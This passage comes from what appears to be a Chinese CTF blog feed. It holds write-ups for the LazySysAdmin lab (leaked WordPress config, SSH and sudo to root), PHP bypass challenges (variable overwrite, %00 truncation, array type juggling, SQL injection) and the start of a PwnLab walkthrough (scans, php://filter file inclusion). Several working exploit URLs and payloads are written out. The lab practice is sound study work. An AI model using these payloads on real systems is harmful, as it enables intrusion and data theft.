prefix</span></span><br><span class="line"><span class="comment"> * * ABSPATH</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://codex.wordpress.org/Editing_wp-config.php</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> WordPress</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;Admin&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;TogieMYSQL12345^^&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The Database Collate type. Don&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@+</span></span><br><span class="line"><span class="comment"> * Authentication Unique Keys and Salts.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change these to different unique phrases!</span></span><br><span class="line"><span class="comment"> * You can generate these using the &#123;<span class="doctag">@link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span></span><br><span class="line"><span class="comment"> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.6.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;SAq-)W,-K9tFcW(=?ro4SJ5)R.mx%+@KL-I@PB&#123;&lt;-i&gt;g3n^1|E&lt;-uN|&#125;F;:PbMYJ&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;u .o%Ld%m27waNqK+*`~&amp;j6~v!d7vI|OwA|hd8%r#ri_`WRIcCN-KiTSWmk)1;xG&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;iX^NN~N7R5Mdmeh:$iLY60r~K[)^f5vk`wGDO30r8Ns)gA17FRt2|$#S!Lq@-&lt;|`&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;,_xAk=+)B7f_a|#J44&#125;qWca!=`s4&#123;C2.Xe&gt;sY%4Ybd5*3z9WRH-ysm=.|Gm^McvU&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;(:^&lt;BWwzWYx ,f^9anxD,+V+2-&amp;,VJ@@)U7CSzjv_MvD67&gt;?05ihCG]Q1K:_7Xsa&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;ud]&#125;&#125;0rWRMGZ+a`Hky G7|i|+c7YyH4=l#5&#123;/1R=|]PYrOmN&#123;&amp;0JuqkO=o5vyGg5&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;=M_DRp%vGmijIhl%K!(v&gt;:,*RR&lt;cl9ahav%&#123;q`&amp;I/0HD/$W/LK:mxR37PKh?Zzi8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;ABOgE&gt;G:U;Q/hO^&gt;jBG5e96OL6+&#123;=mV,|2S~c,~dhVa!E/&amp;Q[Mc8#IgVTuXAI&#125;sY&#x27;</span>);</span><br><span class="line"></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@-*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * WordPress Database Table prefix.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can have multiple installations in one database if you give each</span></span><br><span class="line"><span class="comment"> * a unique prefix. Only numbers, letters, and underscores please!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$table_prefix</span>  = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * For developers: WordPress debugging mode.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change this to true to enable the display of notices during development.</span></span><br><span class="line"><span class="comment"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span></span><br><span class="line"><span class="comment"> * in their development environments.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For information on other constants that can be used for debugging,</span></span><br><span class="line"><span class="comment"> * visit the Codex.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://codex.wordpress.org/Debugging_in_WordPress</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* That&#x27;s all, stop editing! Happy blogging. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="keyword">if</span> ( !<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;ABSPATH&#x27;</span>) )</span><br><span class="line">	<span class="title function_ invoke__">define</span>(<span class="string">&#x27;ABSPATH&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Dynamic site URL added by Togie */</span></span><br><span class="line"><span class="variable">$currenthost</span> = <span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>];</span><br><span class="line"><span class="variable">$currentpath</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;@/+$@&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>]));</span><br><span class="line"><span class="variable">$currentpath</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\/wp.+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$currentpath</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_HOME&#x27;</span>,<span class="variable">$currenthost</span>.<span class="variable">$currentpath</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_SITEURL&#x27;</span>,<span class="variable">$currenthost</span>.<span class="variable">$currentpath</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_CONTENT_URL&#x27;</span>, <span class="variable">$currenthost</span>.<span class="variable">$currentpath</span>.<span class="string">&#x27;/wp-content&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_PLUGIN_URL&#x27;</span>, <span class="variable">$currenthost</span>.<span class="variable">$currentpath</span>.<span class="string">&#x27;/wp-content/plugins&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DOMAIN_CURRENT_SITE&#x27;</span>, <span class="variable">$currenthost</span>.<span class="variable">$currentpath</span> );</span><br><span class="line">@<span class="title function_ invoke__">define</span>(<span class="string">&#x27;ADMIN_COOKIE_PATH&#x27;</span>, <span class="string">&#x27;./&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="keyword">require_once</span>(ABSPATH . <span class="string">&#x27;wp-settings.php&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>访问http://172.17.135.63/wordpress/ 得到提示,my name is togie.</p>
<p>ssh链接<code>ssh togie@172.17.135.63</code>密码<strong>12345</strong>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">togie@LazySysAdmin:~$ cd </span><br><span class="line">-rbash: cd: restricted</span><br></pre></td></tr></table></figure> 切换至bash</p>
<p><code>sudo -s</code>提权到root <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">togie@LazySysAdmin:~$ sudo -s</span><br><span class="line">[sudo] password for togie: </span><br><span class="line">root@LazySysAdmin:~# whoami</span><br><span class="line">root</span><br><span class="line">root@LazySysAdmin:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p>
<p>root依然默认使用rbash切换到bash,但是从passwd中看是bash,但是就是不能用cd
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@LazySysAdmin:/root<span class="comment"># cat proof.txt </span></span><br><span class="line">WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ<span class="comment">#PT9851</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Well <span class="keyword">done</span> :)</span><br><span class="line"></span><br><span class="line">Hope you learn<span class="string">&#x27;t a few things along the way.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Regards,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Togie Mcdogie</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enjoy some random strings</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ#PT9851</span></span><br><span class="line"><span class="string">2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7</span></span><br><span class="line"><span class="string">pf%&amp;1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02</span></span><br><span class="line"><span class="string">bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
  </entry>
  <entry>
    <title>靶场65</title>
    <url>/%E9%9D%B6%E5%9C%BA65/</url>
    <content><![CDATA[<h4 id="less-1">less-1</h4>
<p>首先呢,这里有一个<code>extract</code>函数接收了<code>\$_GET</code>,百度一下
得知这个函数会把数组中的键名作为变量名,键值作为变量值,来生成变量
审题得知$flag变量在extract之上,所以可以重新对flag赋值,对flag赋值一个不存在的文件名,这样file_get_contents($flag)只能获取到空
trim去除空格,这样我们只需要把shiyan设置成空就可以打印flag01.php的内容了
构造url:
<code>http://172.17.135.65/less-1.php?shiyan=&amp;flag=bucunzai</code></p>
<p><a
href="https://www.freebuf.com/column/150731.html">变量覆盖漏洞原理</a></p>
<h5 id="extract">extract()</h5>
<ol type="1">
<li>extract() 函数从数组中将变量导入到当前的符号表。</li>
<li>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</li>
<li>该函数返回成功设置的变量数目。</li>
</ol>
<hr />
<h4 id="less-2">less-2</h4>
<p>have a fun!! hints:less-2 de zip 直接改成<a
href="http://172.17.135.65/less-2.zip">http://172.17.135.65/less-2.zip</a>
down下来源码
首先根据<code>isset($_GET['number']</code>,要以get方式提交一个名字叫number的变量.
为了绕过<code>is_numeric</code>函数,应该使用%00截断,为什么要用%00阶段呢?因为后面的要求是这个字符串必须要能转换成他自己的整型变量
绕过函数原理为该函数只会读取字符到%00停止,如果在%00后面加东西,他是无法检测出来的,只会依据%00之前的字符判断类型
而后面的读取会忽略0x00,直接读取完字符串,这就是绕过原理 接下来,
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$value1</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$req</span>[<span class="string">&quot;number&quot;</span>]);</span><br><span class="line"><span class="variable">$value2</span> = <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$req</span>[<span class="string">&quot;number&quot;</span>]));</span><br></pre></td></tr></table></figure>
试图判断是否为回文,这里要用到空白字符由于特性,<code>intval</code>函数会忽略/f,但是<code>strval</code>函数并不会,所以,在回文数检测时,那个传入的文本头是,返回的是一个假,所以我们得到了flag
构造url:<code>http://172.17.135.65/less-2.php?number=%00%0c22</code></p>
<hr />
<h4 id="less-3">less-3</h4>
<p>首先要求设置以get方式设置password
第二个if要求必须为数字和字母,<code>^[a-zA-Z0-9]+$</code>,确保了科学计数法的可行性
由于<code>strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999</code>,所以不能构造数字,所以构造1E7就可以绕过限制了,
接下来要<code>strpos ($_GET['password'], '*-*') !== FALSE</code>
说明password字符串中应该有<em>-</em>字符,但是前面有限制是password必须为数字,所提用%00截断
构造url:<code>http://172.17.135.65/less-3.php?password=1E7%f*-*</code>
<a
href="https://blog.csdn.net/zpy1998zpy/article/details/80545408">%00截断原理</a>
##### ereg() 1.
ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。
2.
ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配.</p>
<hr />
<h4 id="less-4">less-4</h4>
<p>传入一个非字符的变量a即可,例如object,数组
构造url:<code>http://172.17.135.65/less-4.php?a[]</code> <a
href="https://blog.csdn.net/cherrie007/article/details/77473817">strcmp漏洞原理</a>
##### strcmp() 1. strcmp() 函数比较两个字符串,且大小写敏感. 2.
这个strcmp函数用于比较字符串是否相等,可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return
0 !!!! 也就是虽然报了错，但却判定其相等了。</p>
<hr />
<h4 id="less-5">less-5</h4>
<p>如果把这两个字段构造为数组，如：<code>?name[]=a&amp;password[]=b</code>，这样在第一处判断时两数组确实是不同的，但在第二处判断时由于sha1()函数无法处理数组类型，将报错并返回false，if
条件成立，获得flag。
构造url:<code>http://172.17.135.65/less-5.php?name[]=xiaoming&amp;password[]=123456</code>
<a
href="https://blog.csdn.net/qq_33020901/article/details/60596940">md5/sha1漏洞原理</a></p>
<hr />
<h4 id="less-6">less-6</h4>
<p>原理同上
构造url:<code>http://172.17.135.65/less-6.php?username[]=1&amp;password[]=2</code></p>
<hr />
<h4 id="less-7">less-7</h4>
<p>首先检测了是否使用POST方法提交表单,一定使用POST方法提交表单,否则没戏
##### 正则规则: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[:graph:] : 除空格，TAB外的所有字符</span><br><span class="line">[:punct:] : 任何标点符号</span><br><span class="line">[:digit:] : 任何数字</span><br><span class="line">[:upper:] : 任何大写字母</span><br><span class="line">[:lower:] : 任何小写字母</span><br></pre></td></tr></table></figure>
第一个规则,你要使用大于12个除了空格和tab的其他字符通过判断
第二个规则,任何除了空格,Tab外的所有字符,不能超过6个
第三个规则,任何除了空格,Tab外的其他字符,不能少于三个</p>
<p>POST数据构造:<code>password=42.000e%2b000000000</code></p>
<p><a
href="https://foxgrin.github.io/posts/25617/">数字验证正则绕过</a></p>
<hr />
<h4 id="less-8">less-8</h4>
<p>POST参数 user='and 0=1 union select
'e10adc3949ba59abbe56e057f20f883e' #&amp;pass=123456</p>
<hr />
<h4 id="less-9">less-9</h4>
<p>一大堆rand,不是真的算 把SESSION和passwoed修改掉就行了</p>
<p><a
href="https://blog.csdn.net/lymingha0/article/details/44079981">解题思路</a></p>
<hr />
<h4 id="less-10">less-10</h4>
<p>首先根据题意写代码 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$p</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$p</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$role</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$p</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$role</span>;</span><br></pre></td></tr></table></figure> 使用chrome
编辑cookies来弹出cookies</p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
  </entry>
  <entry>
    <title>靶场71</title>
    <url>/%E9%9D%B6%E5%9C%BA71/</url>
    <content><![CDATA[<h1 id="靶场71">靶场71</h1>
<p>nmap扫描 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap 172.17.135.71 -sS -Pn -O</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2019-05-23 21:03 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.17.135.71</span><br><span class="line">Host is up (0.0034s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.6</span><br><span class="line">Network Distance: 3 hops</span><br><span class="line"></span><br><span class="line">OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 5.27 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>dirb扫描 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dirb http://172.17.135.71 ctf/dir/php.txt </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu May 23 21:12:43 2019</span><br><span class="line">URL_BASE: http://172.17.135.71/</span><br><span class="line">WORDLIST_FILES: ctf/dir/php.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 3355                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://172.17.135.71/ ----</span><br><span class="line">+ http://172.17.135.71//index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=../../ (CODE:200|SIZE:332)                                                                          </span><br><span class="line">+ http://172.17.135.71//index.php (CODE:200|SIZE:332)                                                                                                                                          </span><br><span class="line">+ http://172.17.135.71//config.php (CODE:200|SIZE:0)                                                                                                                                           </span><br><span class="line">+ http://172.17.135.71//login.php (CODE:200|SIZE:250)                                                                                                                                          </span><br><span class="line">+ http://172.17.135.71//upload.php?action=upfile (CODE:200|SIZE:19)                                                                                                                            </span><br><span class="line">+ http://172.17.135.71//upload.php (CODE:200|SIZE:19)                                                                                                                                          </span><br><span class="line">+ http://172.17.135.71//upload/ (CODE:200|SIZE:4774)                                                                                                                                           </span><br><span class="line">+ http://172.17.135.71//../admin (CODE:400|SIZE:305)                                                                                                                                           </span><br><span class="line">+ http://172.17.135.71//../admin.php (CODE:400|SIZE:305)                                                                                                                                       </span><br><span class="line">+ http://172.17.135.71//../admin/default (CODE:400|SIZE:305)                                                                                                                                   </span><br><span class="line">+ http://172.17.135.71//../admin/default.php (CODE:400|SIZE:305)                                                                                                                               </span><br><span class="line">+ http://172.17.135.71//../admin/index (CODE:400|SIZE:305)                                                                                                                                     </span><br><span class="line">+ http://172.17.135.71//../admin/index.php (CODE:400|SIZE:305)                                                                                                                                 </span><br><span class="line">+ http://172.17.135.71//../admin/login (CODE:400|SIZE:305)                                                                                                                                     </span><br><span class="line">+ http://172.17.135.71//../admin/login.php (CODE:400|SIZE:305)                                                                                                                                 </span><br><span class="line">+ http://172.17.135.71//../admin/manage (CODE:400|SIZE:305)                                                                                                                                    </span><br><span class="line">+ http://172.17.135.71//../admin/manage.php (CODE:400|SIZE:305)                                                                                                                                </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Thu May 23 21:12:51 2019</span><br><span class="line">DOWNLOADED: 3355 - FOUND: 17</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ dirb http://172.17.135.71 ctf/dir/dir.txt </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu May 23 21:13:38 2019</span><br><span class="line">URL_BASE: http://172.17.135.71/</span><br><span class="line">WORDLIST_FILES: ctf/dir/dir.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 1170                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://172.17.135.71/ ----</span><br><span class="line">+ http://172.17.135.71//images/ (CODE:200|SIZE:942)                                                                                                                                            </span><br><span class="line">+ http://172.17.135.71//upload (CODE:301|SIZE:315)                                                                                                                                             </span><br><span class="line">+ http://172.17.135.71//images (CODE:301|SIZE:315)                                                                                                                                             </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Thu May 23 21:13:41 2019</span><br><span class="line">DOWNLOADED: 1170 - FOUND: 3</span><br></pre></td></tr></table></figure></p>
<p>可疑位置 <code>http://172.17.135.71/index.php?page=login</code>
这里指定了一个页面,尝试指定伪协议
伪协议学习<code>https://lorexxar.cn/2016/09/14/php-wei/</code>
<code>http://172.17.135.71/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</code>
没有结果,因为上面使用的是页面名<code>?page=login</code>,所以使用<code>php://filter/read=convert.base64-encode/resource=index</code></p>
<h3 id="index.php">index.php</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//Multilingual. Not implemented yet.</span></span><br><span class="line"><span class="comment">//setcookie(&quot;lang&quot;,&quot;en.lang.php&quot;);</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lang&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">include</span>(<span class="string">&quot;lang/&quot;</span>.<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lang&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Not implemented yet.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;images/pwnlab.png&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line">[ &lt;a href=<span class="string">&quot;/&quot;</span>&gt;Home&lt;/a&gt; ] [ &lt;a href=<span class="string">&quot;?page=login&quot;</span>&gt;Login&lt;/a&gt; ] [ &lt;a href=<span class="string">&quot;?page=upload&quot;</span>&gt;Upload&lt;/a&gt; ]</span><br><span class="line">&lt;hr/&gt;&lt;br/&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Use this server to upload and share image files inside the intranet&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="login">login</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$server</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$luser</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">	<span class="variable">$lpass</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$stmt</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE user=? AND pass=?&quot;</span>);</span><br><span class="line">	<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;ss&#x27;</span>, <span class="variable">$luser</span>, <span class="variable">$lpass</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">	<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_Result</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;num_rows == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$luser</span>;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?page=upload&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Login failed.&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line">	&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">	&lt;label&gt;Username: &lt;/label&gt;&lt;input id=<span class="string">&quot;user&quot;</span> type=<span class="string">&quot;test&quot;</span> name=<span class="string">&quot;user&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line">	&lt;label&gt;Password: &lt;/label&gt;&lt;input id=<span class="string">&quot;pass&quot;</span> type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;pass&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line">	&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Login&quot;</span>&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="config">config</h3>
